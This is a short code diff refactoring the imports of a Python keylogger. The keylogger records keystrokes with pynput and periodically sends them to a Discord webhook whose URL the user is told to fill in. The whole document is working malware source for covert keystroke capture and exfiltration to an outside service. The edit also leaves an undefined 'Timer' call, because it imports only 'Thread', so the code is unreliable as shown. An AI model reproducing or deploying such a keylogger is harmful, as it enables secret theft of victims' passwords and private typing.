@@ -1,6 +1,6 @@
 from pynput.keyboard import Listener
-import threading
-import dhooks
+from threading import Thread
+from dhooks import Webhook
 
 
 WEBHOOK_URL = ""  # Put here your discord webhook url.
@@ -15,7 +15,7 @@ class Keylogger:
 
     def _send_info(self, log):
         if log != "":
-            webhook = dhooks.Webhook(self.WB_URL)
+            webhook = Webhook(self.WB_URL)
             webhook.send(log)
 
     def _key_down(self, key):
@@ -32,7 +32,7 @@ class Keylogger:
     def _report(self):
         self._send_info(self.log)
         self.log = ""
-        threading.Timer(self.interval, self._report).start()
+        Timer(self.interval, self._report).start()
 
     def run(self):
         self._report()
